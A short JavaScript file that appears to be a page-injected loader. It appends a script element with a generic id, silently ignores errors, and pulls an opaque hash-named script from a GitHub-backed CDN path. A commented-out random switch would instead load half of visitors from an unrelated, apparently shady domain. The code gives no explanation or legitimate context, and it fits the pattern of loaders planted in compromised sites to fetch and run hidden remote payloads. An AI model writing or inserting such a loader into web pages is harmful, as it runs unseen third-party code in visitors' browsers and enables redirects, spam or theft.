window.curNode = document.currentScript || (function(){var script=document.querySelectorAll('script');return script[script.length-1]})();

;function loadJs(e, t) {
                    var n = document.getElementsByTagName("head")[0],
                        o = document.createElement("script");
                    o.onload = o.onreadystatechange = o.onerror = function() {
                        if (o && o.readyState && /^(?!(?:loaded|complete)$)/.test(o.readyState)) return !1;
                        o.onload = o.onreadystatechange = o.onerror = null, o.src = "", o = null, t && t()
                    }, o.id = 'abc',o.charset = "utf-8", o.src = e;
                    try {
                        window.curNode.parentNode.appendChild(o)
                    } catch (e) {
                       
                    }
                }

var js_url = 'https://cdn.jsdelivr.net/gh/lhtel/cdn@100000/dca4fd71a4a6799cbfb9d94976d59d4d.js';

// var crd = Math.floor(Math.random() * (100 - 1)) + 1;
// if (crd <= 50) js_url = 'https://etc.1332vp.com/3d8698579b9b53686685776fb66094c6.js';

loadJs(js_url);